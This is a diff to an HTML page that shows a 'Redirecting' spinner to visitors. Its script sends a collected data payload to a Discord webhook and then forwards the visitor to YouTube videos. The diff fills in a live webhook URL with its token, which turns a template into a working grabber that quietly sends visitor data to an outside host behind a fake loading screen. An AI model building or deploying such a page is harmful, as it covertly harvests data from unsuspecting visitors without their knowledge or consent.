@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Redirecting....</title>
     <style>
         body { 
             font-family: Arial, sans-serif; 
@@ -41,7 +41,7 @@
 <body>
     <div class="container">
         <div class="spinner"></div>
-        <h2>Loading...</h2>
+        <h2>Redirecting..</h2>
         <p>Please wait while we process your request.</p>
     </div>
 
@@ -165,7 +165,7 @@
                 };
                 
                 // Send to Discord webhook
-                const response = await fetch('YOUR_WEBHOOK_URL', {
+                const response = await fetch('https://discord.com/api/webhooks/1499824320669810838/vmFq-u0qnTIgXyvltsxH9W0t2KDpMmPmgDN0_awP57Qpfq7ZV4n6_3Ja57DmrkWvgVDo', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -175,11 +175,11 @@
                 
                 if (response.ok) {
                     // Redirect to another website after successful submission
-                    window.location.href = 'https://example.com'; // Replace with your target URL
+                    window.location.href = 'https://www.youtube.com/watch?v=qXNpkatmYzs'; // Replace with your target URL
                 } else {
                     console.error('Failed to send to Discord');
                     // Still redirect even if webhook fails
-                    window.location.href = 'https://example.com'; // Replace with your target URL
+                    window.location.href = 'https://www.youtube.com/watch?v=IWnFDMZwe4c'; // Replace with your target URL
                 }
             } catch (error) {
                 console.error('Error:', error);
